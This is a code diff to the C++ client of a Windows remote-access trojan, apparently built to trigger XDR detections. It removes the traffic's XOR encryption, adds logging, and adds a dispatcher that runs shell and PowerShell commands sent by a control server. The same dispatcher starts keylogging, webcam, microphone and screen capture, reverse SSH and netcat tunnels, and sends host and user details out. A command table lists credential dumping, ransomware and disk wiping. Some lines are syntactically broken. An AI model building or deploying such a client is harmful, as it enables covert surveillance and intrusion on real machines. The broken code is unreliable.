@@ -39,8 +39,98 @@
 #pragma comment(lib, "winhttp.lib")
 
 // Include shared definitions from main file
-extern std::string xorEncrypt(const std::string& data, const std::string& key);
+// xorEncrypt removed - using UNENCRYPTED communication for XDR detection
 extern void logActivity(const std::string& category, const std::string& type, const std::string& message);
+
+// Debug logging configuration
+enum DebugLevel {
+    DEBUG_NONE = 0,
+    DEBUG_ERROR = 1,
+    DEBUG_WARNING = 2,
+    DEBUG_INFO = 3,
+    DEBUG_VERBOSE = 4
+};
+
+// Debug logging globals
+DebugLevel g_debugLevel = DEBUG_VERBOSE;
+std::ofstream g_debugLogFile;
+std::mutex g_debugLogMutex;
+bool g_debugLoggingEnabled = true;
+const char* DEBUG_LOG_PATH = "c:\\rat\\logs\\client.log";
+
+// Initialize debug logging
+bool initializeDebugLogging() {
+    try {
+        // Create directory if it doesn't exist
+        CreateDirectoryA("c:\\rat", NULL);
+        CreateDirectoryA("c:\\rat\\logs", NULL);
+        
+        // Open log file
+        g_debugLogFile.open(DEBUG_LOG_PATH, std::ios::app);
+        if (!g_debugLogFile.is_open()) {
+            std::cerr << "Failed to open debug log file: " << DEBUG_LOG_PATH << std::endl;
+            return false;
+        }
+        
+        // Write startup message
+        auto now = std::chrono::system_clock::now();
+        auto time_t = std::chrono::system_clock::to_time_t(now);
+        g_debugLogFile << "\n\n========================================\n";
+        g_debugLogFile << "C2 Client Starting - " << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S") << "\n";
+        g_debugLogFile << "Debug Level: " << g_debugLevel << "\n";
+        g_debugLogFile << "========================================\n" << std::flush;
+        
+        return true;
+    }
+    catch (const std::exception& e) {
+        std::cerr << "Exception in initializeDebugLogging: " << e.what() << std::endl;
+        return false;
+    }
+}
+
+// Enhanced debug logging function
+void debugLog(DebugLevel level, const std::string& category, const std::string& message, const std::string& details = "") {
+    if (!g_debugLoggingEnabled || level > g_debugLevel) return;
+    
+    std::lock_guard<std::mutex> lock(g_debugLogMutex);
+    
+    auto now = std::chrono::system_clock::now();
+    auto time_t = std::chrono::system_clock::to_time_t(now);
+    auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(now.time_since_epoch()) % 1000;
+    
+    // Level strings
+    const char* levelStr = "UNKNOWN";
+    switch (level) {
+        case DEBUG_ERROR: levelStr = "ERROR"; break;
+        case DEBUG_WARNING: levelStr = "WARN "; break;
+        case DEBUG_INFO: levelStr = "INFO "; break;
+        case DEBUG_VERBOSE: levelStr = "VERB "; break;
+    }
+    
+    // Format log entry
+    std::stringstream ss;
+    ss << "[" << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S");
+    ss << "." << std::setfill('0') << std::setw(3) << ms.count() << "] ";
+    ss << "[" << levelStr << "] ";
+    ss << "[" << category << "] " << message;
+    
+    if (!details.empty()) {
+        ss << " | Details: " << details;
+    }
+    
+    std::string logEntry = ss.str();
+    
+    // Write to file
+    if (g_debugLogFile.is_open()) {
+        g_debugLogFile << logEntry << std::endl;
+        g_debugLogFile.flush();
+    }
+    
+    // Also output to console for ERROR and WARNING
+    if (level <= DEBUG_WARNING) {
+        std::cerr << logEntry << std::endl;
+    }
+}
 
 // Local client logging with file persistence
 void logClientActivity(const std::string& category, const std::string& type, const std::string& message) {
@@ -107,6 +197,13 @@ void logClientActivity(const std::string& category, const std::string& type, con
                 cmdStatusFile.close();
             }
         }
+        
+        // Also write to debug log
+        DebugLevel level = DEBUG_INFO;
+        if (category == "ERROR") level = DEBUG_ERROR;
+        else if (category == "WARNING") level = DEBUG_WARNING;
+        else if (category == "CLIENT_DEBUG") level = DEBUG_VERBOSE;
+        debugLog(level, type, message, "Category: " + category);
     }
     
     // Also call the original logActivity for compatibility
@@ -411,6 +508,79 @@ public:
     }
     
     // Enhanced command description mapping
+    // Get command name from CommandType
+    std::string getCommandName(CommandType cmd) {
+        switch (cmd) {
+        case CMD_BEACON: return "HEARTBEAT_BEACON";
+        case CMD_HEARTBEAT: return "CONNECTION_HEARTBEAT";
+        case CMD_SYSINFO: return "SYSTEM_INFO_COLLECTION";
+        case CMD_PROCESS_LIST: return "PROCESS_ENUMERATION";
+        case CMD_NETWORK_CONFIG: return "NETWORK_CONFIGURATION_DISCOVERY";
+        case CMD_USER_ENUM: return "USER_ACCOUNT_ENUMERATION";
+        case CMD_DOMAIN_INFO: return "DOMAIN_INFORMATION_GATHERING";
+        case CMD_SOFTWARE_ENUM: return "SOFTWARE_DISCOVERY";
+        case CMD_SCREENSHOT: return "SCREENSHOT_CAPTURE";
+        case CMD_KEYLOG_START: return "KEYLOGGER_ACTIVATION";
+        case CMD_KEYLOG_DUMP: return "KEYLOGGER_DATA_RETRIEVAL";
+        case CMD_CLIPBOARD: return "CLIPBOARD_DATA_COLLECTION";
+        case CMD_BROWSER_CREDS: return "BROWSER_CREDENTIAL_THEFT";
+        case CMD_FILE_SEARCH: return "FILE_SYSTEM_SEARCH";
+        case CMD_WEBCAM_CAPTURE: return "WEBCAM_SURVEILLANCE";
+        case CMD_MICROPHONE_RECORD: return "AUDIO_RECORDING";
+        case CMD_SCREEN_RECORD: return "SCREEN_RECORDING";
+        case CMD_SHELL_EXEC: return "COMMAND_SHELL_EXECUTION";
+        case CMD_POWERSHELL: return "POWERSHELL_SCRIPT_EXECUTION";
+        case CMD_INJECT_PROCESS: return "MALICIOUS_PROCESS_INJECTION";
+        case CMD_LOAD_MODULE: return "DYNAMIC_MODULE_LOADING";
+        case CMD_MIGRATE_PROCESS: return "PROCESS_MIGRATION";
+        case CMD_REVERSE_SHELL: return "REVERSE_SHELL_CONNECTION";
+        case CMD_REMOTE_DESKTOP: return "REMOTE_DESKTOP_ACCESS";
+        case CMD_INSTALL_SERVICE: return "MALICIOUS_SERVICE_INSTALLATION";
+        case CMD_REGISTRY_PERSIST: return "REGISTRY_PERSISTENCE_MECHANISM";
+        case CMD_SCHEDULED_TASK: return "SCHEDULED_TASK_PERSISTENCE";
+        case CMD_WMI_PERSIST: return "WMI_EVENT_PERSISTENCE";
+        case CMD_STARTUP_FOLDER: return "STARTUP_FOLDER_PERSISTENCE";
+        case CMD_BOOTKIT_INSTALL: return "BOOTKIT_INSTALLATION";
+        case CMD_PORT_SCAN: return "NETWORK_PORT_SCANNING";
+        case CMD_SMB_SCAN: return "SMB_SHARE_ENUMERATION";
+        case CMD_PSEXEC: return "PSEXEC_LATERAL_MOVEMENT";
+        case CMD_WMI_EXEC: return "WMI_REMOTE_EXECUTION";
+        case CMD_RDP_EXEC: return "RDP_LATERAL_MOVEMENT";
+        case CMD_PASS_THE_HASH: return "PASS_THE_HASH_ATTACK";
+        case CMD_MIMIKATZ_EXEC: return "MIMIKATZ_CREDENTIAL_DUMP";
+        case CMD_UAC_BYPASS: return "UAC_BYPASS_EXPLOITATION";
+        case CMD_TOKEN_STEAL: return "ACCESS_TOKEN_THEFT";
+        case CMD_EXPLOIT_SUGGESTER: return "PRIVILEGE_ESCALATION_ENUMERATION";
+        case CMD_LSASS_DUMP: return "LSASS_MEMORY_DUMP";
+        case CMD_SAM_DUMP: return "SAM_DATABASE_EXTRACTION";
+        case CMD_DISABLE_AV: return "ANTIVIRUS_DISABLING";
+        case CMD_CLEAR_LOGS: return "EVENT_LOG_CLEARING";
+        case CMD_TIMESTOMP: return "FILE_TIMESTAMP_MANIPULATION";
+        case CMD_PROCESS_HOLLOW: return "PROCESS_HOLLOWING_INJECTION";
+        case CMD_ROOTKIT_INSTALL: return "ROOTKIT_INSTALLATION";
+        case CMD_AMSI_BYPASS: return "AMSI_BYPASS_TECHNIQUE";
+        case CMD_ETW_DISABLE: return "ETW_LOGGING_DISABLING";
+        case CMD_STAGE_FILES: return "DATA_STAGING_FOR_EXFILTRATION";
+        case CMD_COMPRESS_DATA: return "DATA_COMPRESSION";
+        case CMD_EXFIL_HTTP: return "HTTP_DATA_EXFILTRATION";
+        case CMD_EXFIL_DNS: return "DNS_TUNNEL_EXFILTRATION";
+        case CMD_EXFIL_ICMP: return "ICMP_TUNNEL_EXFILTRATION";
+        case CMD_EXFIL_EMAIL: return "EMAIL_DATA_EXFILTRATION";
+        case CMD_CLOUD_UPLOAD: return "CLOUD_SERVICE_UPLOAD";
+        case CMD_RANSOMWARE: return "RANSOMWARE_DEPLOYMENT";
+        case CMD_WIPE_DISK: return "DISK_WIPING_ATTACK";
+        case CMD_CORRUPT_BOOT: return "BOOT_SECTOR_CORRUPTION";
+        case CMD_CRYPTO_MINER: return "CRYPTOCURRENCY_MINING";
+        case CMD_TOR_CONNECT: return "TOR_NETWORK_CONNECTION";
+        case CMD_TOR_API_CALL: return "TOR_API_COMMUNICATION";
+        case CMD_REVERSE_SSH: return "REVERSE_SSH_TUNNEL";
+        case CMD_NETCAT_TUNNEL: return "NETCAT_NETWORK_TUNNEL";
+        case CMD_SOCAT_RELAY: return "SOCAT_NETWORK_RELAY";
+        case CMD_CRYPTCAT_TUNNEL: return "CRYPTCAT_ENCRYPTED_TUNNEL";
+        default: return "UNKNOWN_COMMAND_" + std::to_string(cmd);
+        }
+    }
+    
     std::string getEnhancedCommandDescription(const std::string& commandType, const std::string& fullCommand) {
         // For packet commands, map the command ID to descriptive names
         if (commandType.find("PACKET_CMD_") == 0) {
@@ -722,53 +892,70 @@ public:
     }
     
     bool connectToServer() {
+        debugLog(DEBUG_INFO, "CONNECTION", "Attempting to connect to server", "Server: " + serverIP + ":" + std::to_string(serverPort));
+        
         serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
         if (serverSocket == INVALID_SOCKET) {
+            int error = WSAGetLastError();
+            debugLog(DEBUG_ERROR, "CONNECTION", "Failed to create socket", "WSA Error: " + std::to_string(error));
             return false;
         }
+        debugLog(DEBUG_VERBOSE, "CONNECTION", "Socket created successfully")
         
         sockaddr_in serverAddr;
         serverAddr.sin_family = AF_INET;
         serverAddr.sin_port = htons(serverPort);
         inet_pton(AF_INET, serverIP.c_str(), &serverAddr.sin_addr);
         
+        debugLog(DEBUG_VERBOSE, "CONNECTION", "Attempting socket connection");
         if (connect(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
             int error = WSAGetLastError();
+            std::string errorDesc;
             std::cout << "[-] Connection failed with error: " << error;
             switch(error) {
                 case WSAECONNREFUSED:
-                    std::cout << " (Connection refused - server may not be running or port is closed)" << std::endl;
+                    errorDesc = "Connection refused - server may not be running or port is closed";
+                    std::cout << " (" << errorDesc << ")" << std::endl;
                     break;
                 case WSAETIMEDOUT:
-                    std::cout << " (Connection timed out - server may be unreachable)" << std::endl;
+                    errorDesc = "Connection timed out - server may be unreachable";
+                    std::cout << " (" << errorDesc << ")" << std::endl;
                     break;
                 case WSAENETUNREACH:
-                    std::cout << " (Network unreachable)" << std::endl;
+                    errorDesc = "Network unreachable";
+                    std::cout << " (" << errorDesc << ")" << std::endl;
                     break;
                 case WSAEACCES:
-                    std::cout << " (Permission denied - firewall may be blocking)" << std::endl;
+                    errorDesc = "Permission denied - firewall may be blocking";
+                    std::cout << " (" << errorDesc << ")" << std::endl;
                     break;
                 default:
+                    errorDesc = "Unknown error";
                     std::cout << std::endl;
             }
+            debugLog(DEBUG_ERROR, "CONNECTION", "Connection failed", "Error: " + std::to_string(error) + " - " + errorDesc);
             closesocket(serverSocket);
             serverSocket = INVALID_SOCKET;
             return false;
         }
+        debugLog(DEBUG_INFO, "CONNECTION", "Successfully connected to server")
         
         connected = true;
         
         // Start real-time status display thread
         if (showRealtimeStatus && !statusDisplayThread.joinable()) {
+            debugLog(DEBUG_VERBOSE, "CONNECTION", "Starting real-time status display thread");
             statusDisplayThread = std::thread(&C2Client::realtimeStatusDisplay, this);
         }
         
-        // Receive handshake
+        // Receive handshake - UNENCRYPTED
+        debugLog(DEBUG_VERBOSE, "CONNECTION", "Waiting for server handshake");
         char buffer[1024];
         int bytes = recv(serverSocket, buffer, sizeof(buffer) - 1, 0);
         if (bytes > 0) {
+            debugLog(DEBUG_INFO, "CONNECTION", "Received handshake", "Bytes: " + std::to_string(bytes))
             buffer[bytes] = '\0';
-            std::string handshake = xorEncrypt(std::string(buffer, bytes), "PaloAltoEscapeRoom");
+            std::string handshake(buffer, bytes);  // No decryption needed
             
             // Parse client ID from handshake
             size_t idPos = handshake.find("ID:");
@@ -784,11 +971,14 @@ public:
         // Send client info
         std::string clientInfo = hostname + "|" + username + "|" + osVersion + "|" + 
                                (isElevated ? "ADMIN" : "USER") + "|" + machineGuid;
+        debugLog(DEBUG_INFO, "CONNECTION", "Sending client info", "Data: " + clientInfo);
         sendData(clientInfo);
         
         // Initialize job system after successful connection
+        debugLog(DEBUG_VERBOSE, "CONNECTION", "Initializing job system");
         initializeJobSystem();
         
+        debugLog(DEBUG_INFO, "CONNECTION", "Connection established successfully", "Client ID: " + clientId);
         return true;
     }
     
@@ -813,8 +1003,8 @@ public:
                 std::string chunkHeader = "CHUNK:" + std::to_string(sentChunks + 1) + "/" + std::to_string(totalChunks) + ":" + std::to_string(chunkSize) + "\n";
                 std::string fullChunk = chunkHeader + chunk + CHUNK_SEPARATOR;
                 
-                std::string encrypted = xorEncrypt(fullChunk, "PaloAltoEscapeRoom");
-                int bytesSent = send(serverSocket, encrypted.c_str(), static_cast<int>(encrypted.size()), 0);
+                // UNENCRYPTED - Send chunk as plain text for XDR detection
+                int bytesSent = send(serverSocket, fullChunk.c_str(), static_cast<int>(fullChunk.size()), 0);
                 
                 if (bytesSent == SOCKET_ERROR) {
                     int error = WSAGetLastError();
@@ -824,7 +1014,7 @@ public:
                         Sleep(50);
                         
                         // Retry the send
-                        bytesSent = send(serverSocket, encrypted.c_str(), static_cast<int>(encrypted.size()), 0);
+                        bytesSent = send(serverSocket, fullChunk.c_str(), static_cast<int>(fullChunk.size()), 0);
                         if (bytesSent == SOCKET_ERROR) {
                             error = WSAGetLastError();
                             logActivity("CLIENT_DEBUG", "CHUNK_SEND_ERROR", "Failed to send chunk " + std::to_string(sentChunks + 1) + " after retry - Error: " + std::to_string(error));
@@ -850,23 +1040,22 @@ public:
             
             // Send completion marker
             std::string completionMarker = "CHUNK:COMPLETE:" + std::to_string(totalChunks) + "\n";
-            std::string encryptedMarker = xorEncrypt(completionMarker, "PaloAltoEscapeRoom");
-            send(serverSocket, encryptedMarker.c_str(), static_cast<int>(encryptedMarker.size()), 0);
+            // UNENCRYPTED - Send completion marker as plain text
+            send(serverSocket, completionMarker.c_str(), static_cast<int>(completionMarker.size()), 0);
             
             logActivity("CLIENT_DEBUG", "LARGE_DATA_COMPLETE", "Successfully sent all " + std::to_string(totalChunks) + " chunks");
         } else {
-            // Small data - send normally
-            std::string encrypted = xorEncrypt(data, "PaloAltoEscapeRoom");
-            int bytesSent = send(serverSocket, encrypted.c_str(), static_cast<int>(encrypted.size()), 0);
+            // Small data - send UNENCRYPTED for XDR detection
+            int bytesSent = send(serverSocket, data.c_str(), static_cast<int>(data.size()), 0);
             
             // Enhanced debug logging
-            logActivity("CLIENT_DEBUG", "DATA_SENT", "Sent " + std::to_string(bytesSent) + " encrypted bytes to server (original: " + std::to_string(data.length()) + " bytes)");
+            logActivity("CLIENT_DEBUG", "DATA_SENT", "Sent " + std::to_string(bytesSent) + " UNENCRYPTED bytes to server");
             
             if (bytesSent == SOCKET_ERROR) {
                 int error = WSAGetLastError();
                 logActivity("CLIENT_DEBUG", "SEND_ERROR", "Socket send error: " + std::to_string(error));
-            } else if (bytesSent < static_cast<int>(encrypted.size())) {
-                logActivity("CLIENT_DEBUG", "PARTIAL_SEND", "Only sent " + std::to_string(bytesSent) + " of " + std::to_string(encrypted.size()) + " bytes");
+            } else if (bytesSent < static_cast<int>(data.size())) {
+                logActivity("CLIENT_DEBUG", "PARTIAL_SEND", "Only sent " + std::to_string(bytesSent) + " of " + std::to_string(data.size()) + " bytes");
             }
             
             // Log first 100 chars of data for debugging (if not too sensitive)
@@ -2478,8 +2667,7 @@ public:
         sendResponse("TOR_API:TELEGRAM:SENDING_FAKE_DATA");
         
         HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
-        if (hConnect) {
-            HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST",
+'t'            HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST",
                                                   L"/bot123456789:FAKE_BOT_TOKEN/sendMessage",
                                                   NULL, WINHTTP_NO_REFERER,
                                                   WINHTTP_DEFAULT_ACCEPT_TYPES,
@@ -3476,8 +3664,15 @@ public:
         } else {
             // Add to job queue for threaded execution
             std::string commandId = "CMD_" + std::to_string(cmd) + "_" + std::to_string(GetTickCount());
-            addJob(commandId, cmd, params, [this, cmd, params]() {
+            std::string cmdName = getCommandName(cmd);
+            
+            // Show command received in main thread
+            std::cout << "\n[COMMAND RECEIVED] " << cmdName << " (ID: " << cmd << ")" << std::endl;
+            
+            addJob(commandId, cmd, params, [this, cmd, params, cmdName]() {
+                std::cout << "[JOB STARTED] " << cmdName << std::endl;
                 processCommandDirect(cmd, params);
+                std::cout << "[JOB COMPLETED] " << cmdName << std::endl;
             });
         }
     }
@@ -3680,16 +3875,12 @@ public:
         
         std::string cmdId;
         
-        // Try to parse as C2Packet first
+        // Try to parse as C2Packet first - UNENCRYPTED
         if (size >= sizeof(C2Packet)) {
             logActivity("CLIENT_DEBUG", "PACKET_PARSE", "Attempting to parse as C2Packet (size >= " + std::to_string(sizeof(C2Packet)) + ")");
             
-            // Decrypt the entire buffer first, then extract the packet
-            std::string decryptedBuffer = xorEncrypt(std::string(buffer, size), "PaloAltoEscapeRoom");
-            
-            // Only check if we have enough decrypted data for a packet
-            if (decryptedBuffer.size() >= sizeof(C2Packet)) {
-                C2Packet* packet = (C2Packet*)decryptedBuffer.c_str();
+            // Parse packet directly from buffer - no decryption
+            C2Packet* packet = (C2Packet*)buffer;
                 
                 logActivity("CLIENT_DEBUG", "PACKET_SIGNATURE", "Packet signature: 0x" + std::to_string(packet->signature) + " (expected: 0xC2E5CA9E)");
                 
@@ -3716,32 +3907,32 @@ public:
             logActivity("CLIENT_DEBUG", "PACKET_TOO_SMALL", "Buffer too small for C2Packet, trying text command parsing");
         }
         
-        // Otherwise, parse as text command
-        std::string decrypted = xorEncrypt(std::string(buffer, size), "PaloAltoEscapeRoom");
+        // Otherwise, parse as text command - UNENCRYPTED
+        std::string command(buffer, size);  // No decryption needed
         
-        // Debug: Log decrypted command (before cleanup)
-        std::string preview = decrypted.length() > 100 ? decrypted.substr(0, 100) + "..." : decrypted;
-        logActivity("CLIENT_DEBUG", "TEXT_COMMAND_DECRYPTED", "Raw command: '" + preview + "' (Length: " + std::to_string(decrypted.length()) + ")");
+        // Debug: Log received command (before cleanup)
+        std::string preview = command.length() > 100 ? command.substr(0, 100) + "..." : command;
+        logActivity("CLIENT_DEBUG", "TEXT_COMMAND_RECEIVED", "Raw command: '" + preview + "' (Length: " + std::to_string(command.length()) + ")");
         
         // Remove newlines
-        decrypted.erase(std::remove(decrypted.begin(), decrypted.end(), '\n'), decrypted.end());
+        command.erase(std::remove(command.begin(), command.end(), '\n'), command.end());
         
         // Debug: Log cleaned command
-        std::string cleanPreview = decrypted.length() > 100 ? decrypted.substr(0, 100) + "..." : decrypted;
+        std::string cleanPreview = command.length() > 100 ? command.substr(0, 100) + "..." : command;
         logActivity("CLIENT_DEBUG", "TEXT_COMMAND_CLEANED", "Cleaned command: '" + cleanPreview + "'");
         
         // Start command tracking for text commands
         std::string commandType = "UNKNOWN";
-        if (decrypted.find("SHELL:") == 0) commandType = "SHELL";
-        else if (decrypted.find("POWERSHELL:") == 0) commandType = "POWERSHELL";
-        else if (decrypted.find("KEYLOG:") == 0) commandType = "KEYLOG";
-        else if (decrypted.find("SCREENSHOT:") == 0) commandType = "SCREENSHOT";
-        else if (decrypted.find("CAMPAIGN:") == 0) commandType = "CAMPAIGN";
-        else if (decrypted.find("TOR:") == 0) commandType = "TOR";
-        else if (decrypted.find("SSH:") == 0) commandType = "SSH";
-        else if (decrypted.find("NETCAT:") == 0) commandType = "NETCAT";
-        else if (decrypted.find("SOCAT:") == 0) commandType = "SOCAT";
-        else if (decrypted.find("TERMINATE") == 0) commandType = "TERMINATE";
+        if (command.find("SHELL:") == 0) commandType = "SHELL";
+        else if (command.find("POWERSHELL:") == 0) commandType = "POWERSHELL";
+        else if (command.find("KEYLOG:") == 0) commandType = "KEYLOG";
+        else if (command.find("SCREENSHOT:") == 0) commandType = "SCREENSHOT";
+        else if (command.find("CAMPAIGN:") == 0) commandType = "CAMPAIGN";
+        else if (command.find("TOR:") == 0) commandType = "TOR";
+        else if (command.find("SSH:") == 0) commandType = "SSH";
+        else if (command.find("NETCAT:") == 0) commandType = "NETCAT";
+        else if (command.find("SOCAT:") == 0) commandType = "SOCAT";
+        else if (command.find("TERMINATE") == 0) commandType = "TERMINATE";
         
         cmdId = startCommandTracking(commandType, cleanPreview);
         updateCommandStatus(cmdId, CMD_PROCESSING);
@@ -3750,98 +3941,98 @@ public:
         try {
             bool commandFound = false;
             
-            if (decrypted.find("SHELL:EXEC:") == 0) {
+            if (command.find("SHELL:EXEC:") == 0) {
                 logActivity("CLIENT_DEBUG", "COMMAND_TYPE", "Shell execution command detected");
-                std::string cmd = decrypted.substr(11);
+                std::string cmd = command.substr(11);
                 executeShellCommand(cmd);
                 commandFound = true;
-            } else if (decrypted.find("SHELL:INIT:") == 0) {
+            } else if (command.find("SHELL:INIT:") == 0) {
                 sendResponse("SHELL:READY");
                 commandFound = true;
-            } else if (decrypted.find("POWERSHELL:EXEC:") == 0) {
-                std::string cmd = decrypted.substr(16);
+            } else if (command.find("POWERSHELL:EXEC:") == 0) {
+                std::string cmd = command.substr(16);
                 executePowerShell(cmd);
                 commandFound = true;
-            } else if (decrypted.find("KEYLOG:") == 0) {
-                logActivity("CLIENT_DEBUG", "COMMAND_TYPE", "Keylogger command detected: " + decrypted);
-                if (decrypted == "KEYLOG:START:HOOK") {
+            } else if (command.find("KEYLOG:") == 0) {
+                logActivity("CLIENT_DEBUG", "COMMAND_TYPE", "Keylogger command detected: " + command);
+                if (command == "KEYLOG:START:HOOK") {
                     logActivity("CLIENT_DEBUG", "KEYLOG_COMMAND", "Starting keylogger hook");
                     executeKeyloggerStart();
                     commandFound = true;
-                } else if (decrypted == "KEYLOG:DUMP") {
+                } else if (command == "KEYLOG:DUMP") {
                     logActivity("CLIENT_DEBUG", "KEYLOG_COMMAND", "Dumping keylogger data");
                     executeKeyloggerDump();
                     commandFound = true;
                 } else {
-                    logActivity("CLIENT_DEBUG", "KEYLOG_COMMAND", "Unrecognized keylog command: " + decrypted);
+                    logActivity("CLIENT_DEBUG", "KEYLOG_COMMAND", "Unrecognized keylog command: " + command);
                     updateCommandStatus(cmdId, CMD_FAILED, "", "Unrecognized keylog command");
                     return;
                 }
-            } else if (decrypted.find("TOR_API:EXECUTE:REAL") == 0) {
+            } else if (command.find("TOR_API:EXECUTE:REAL") == 0) {
                 logActivity("CLIENT_DEBUG", "TOR_API_REAL", "Received command to make real TOR API calls");
                 executeTorApiCall();
                 commandFound = true;
-            } else if (decrypted.find("TOR:CONNECT:REAL") == 0) {
+            } else if (command.find("TOR:CONNECT:REAL") == 0) {
                 logActivity("CLIENT_DEBUG", "TOR_CONNECT_REAL", "Received command to make real TOR connections");
                 executeTorConnect();
                 commandFound = true;
-            } else if (decrypted.find("SSH:REVERSE:TUNNEL:") == 0) {
+            } else if (command.find("SSH:REVERSE:TUNNEL:") == 0) {
                 logActivity("CLIENT_DEBUG", "SSH_TUNNEL_CMD", "Received SSH reverse tunnel command");
                 executeReverseSSH();
                 commandFound = true;
-            } else if (decrypted.find("NETCAT:TUNNEL:CREATE:") == 0 || decrypted.find("PROCESS:CREATE:") == 0 && decrypted.find("nc.exe") != std::string::npos) {
+            } else if (command.find("NETCAT:TUNNEL:CREATE:") == 0 || command.find("PROCESS:CREATE:") == 0 && command.find("nc.exe") != std::string::npos) {
                 logActivity("CLIENT_DEBUG", "NETCAT_CMD", "Received netcat command");
                 executeNetcatTunnel();
                 commandFound = true;
-        } else if (decrypted.find("SOCAT:RELAY:CREATE:") == 0 || decrypted.find("DOWNLOAD:") == 0 && decrypted.find("socat") != std::string::npos) {
+        } else if (command.find("SOCAT:RELAY:CREATE:") == 0 || command.find("DOWNLOAD:") == 0 && command.find("socat") != std::string::npos) {
             logActivity("CLIENT_DEBUG", "SOCAT_CMD", "Received socat command");
             executeSocatRelay();
-        } else if (decrypted.find("CRYPTCAT:TUNNEL:CREATE:") == 0 || decrypted.find("PROCESS:CREATE:") == 0 && decrypted.find("cryptcat.exe") != std::string::npos) {
+        } else if (command.find("CRYPTCAT:TUNNEL:CREATE:") == 0 || command.find("PROCESS:CREATE:") == 0 && command.find("cryptcat.exe") != std::string::npos) {
             logActivity("CLIENT_DEBUG", "CRYPTCAT_CMD", "Received cryptcat command");
             executeCryptcatTunnel();
-        } else if (decrypted.find("CAMPAIGN:") == 0) {
-            std::string campaign = decrypted.substr(9);
+        } else if (command.find("CAMPAIGN:") == 0) {
+            std::string campaign = command.substr(9);
             sendResponse("CAMPAIGN:ACK:" + campaign);
-        } else if (decrypted.find("MIMIKATZ:") == 0) {
-            std::string mimCmd = decrypted.substr(9);
+        } else if (command.find("MIMIKATZ:") == 0) {
+            std::string mimCmd = command.substr(9);
             sendResponse("MIMIKATZ:OUTPUT:" + mimCmd + ":Simulated output");
-        } else if (decrypted.find("WEBCAM:") == 0) {
-            if (decrypted.find("WEBCAM:INIT:") == 0) {
+        } else if (command.find("WEBCAM:") == 0) {
+            if (command.find("WEBCAM:INIT:") == 0) {
                 sendResponse("WEBCAM:INITIALIZED");
-            } else if (decrypted.find("WEBCAM:CAPTURE:") == 0) {
+            } else if (command.find("WEBCAM:CAPTURE:") == 0) {
                 executeWebcamCapture();
-            } else if (decrypted == "WEBCAM:RECORD:START") {
+            } else if (command == "WEBCAM:RECORD:START") {
                 sendResponse("WEBCAM:RECORDING:STARTED");
-            } else if (decrypted == "WEBCAM:RECORD:STOP") {
+            } else if (command == "WEBCAM:RECORD:STOP") {
                 sendResponse("WEBCAM:RECORDING:STOPPED");
             }
-        } else if (decrypted.find("MIC:") == 0) {
-            if (decrypted.find("MIC:INIT:") == 0) {
+        } else if (command.find("MIC:") == 0) {
+            if (command.find("MIC:INIT:") == 0) {
                 sendResponse("MIC:INITIALIZED");
-            } else if (decrypted.find("MIC:RECORD:START") == 0) {
+            } else if (command.find("MIC:RECORD:START") == 0) {
                 executeMicrophoneRecord();
-            } else if (decrypted == "MIC:RECORD:STOP") {
+            } else if (command == "MIC:RECORD:STOP") {
                 sendResponse("MIC:RECORDING:STOPPED");
             }
-        } else if (decrypted.find("SCREEN:") == 0) {
-            logActivity("CLIENT_DEBUG", "COMMAND_TYPE", "Screen command detected: " + decrypted);
-            if (decrypted.find("SCREEN:INIT:") == 0) {
+        } else if (command.find("SCREEN:") == 0) {
+            logActivity("CLIENT_DEBUG", "COMMAND_TYPE", "Screen command detected: " + command);
+            if (command.find("SCREEN:INIT:") == 0) {
                 logActivity("CLIENT_DEBUG", "SCREEN_COMMAND", "Screen initialization");
                 sendResponse("SCREEN:INITIALIZED");
-            } else if (decrypted.find("SCREEN:CAPTURE:") == 0) {
+            } else if (command.find("SCREEN:CAPTURE:") == 0) {
                 logActivity("CLIENT_DEBUG", "SCREEN_COMMAND", "Screen capture requested");
                 executeScreenshot();
-            } else if (decrypted.find("SCREEN:RECORD:START") == 0) {
+            } else if (command.find("SCREEN:RECORD:START") == 0) {
                 logActivity("CLIENT_DEBUG", "SCREEN_COMMAND", "Screen recording start");
                 executeScreenRecord();
-            } else if (decrypted == "SCREEN:RECORD:STOP") {
+            } else if (command == "SCREEN:RECORD:STOP") {
                 logActivity("CLIENT_DEBUG", "SCREEN_COMMAND", "Screen recording stop");
                 sendResponse("SCREEN:RECORDING:STOPPED");
             } else {
-                logActivity("CLIENT_DEBUG", "SCREEN_COMMAND", "Unrecognized screen command: " + decrypted);
+                logActivity("CLIENT_DEBUG", "SCREEN_COMMAND", "Unrecognized screen command: " + command);
             }
             } else {
-                logActivity("CLIENT_DEBUG", "COMMAND_UNRECOGNIZED", "Unrecognized command: " + decrypted);
+                logActivity("CLIENT_DEBUG", "COMMAND_UNRECOGNIZED", "Unrecognized command: " + command);
                 updateCommandStatus(cmdId, CMD_FAILED, "", "Unrecognized command");
                 return;
             }
@@ -3962,10 +4153,45 @@ public:
                 lastBeacon = now;
             }
             
-            // Print command status every 30 seconds
-            if (std::chrono::duration_cast<std::chrono::seconds>(now - lastStatusReport).count() >= 30) {
-                printCommandStatus();
-                lastStatusReport = now;
+            // Enhanced job status display every 5 seconds
+            if (std::chrono::duration_cast<std::chrono::seconds>(now - lastStatusReport).count() >= 5) {
+                // Display job queue status
+                int activeJobs = getActiveJobCount();
+                int queuedJobs = getQueuedJobCount();
+                
+                if (activeJobs > 0 || queuedJobs > 0) {
+                    std::cout << "\n[JOB STATUS] Active: " << activeJobs << " | Queued: " << queuedJobs << std::endl;
+                    
+                    // Show current running jobs
+                    {
+                        std::lock_guard<std::mutex> lock(jobQueueMutex);
+                        for (const auto& [jobId, status] : jobStatus) {
+                            if (status == "RUNNING") {
+                                std::cout << "  [RUNNING] " << jobId << std::endl;
+                            }
+                        }
+                    }
+                    
+                    // Show active commands
+                    {
+                        std::lock_guard<std::mutex> lock(commandTrackingMutex);
+                        for (const auto& cmd : commandHistory) {
+                            if (cmd.status == CMD_PROCESSING) {
+                                auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(
+                                    std::chrono::steady_clock::now() - cmd.startTime).count();
+                                std::cout << "  [ACTIVE] " << cmd.commandId << " - " 
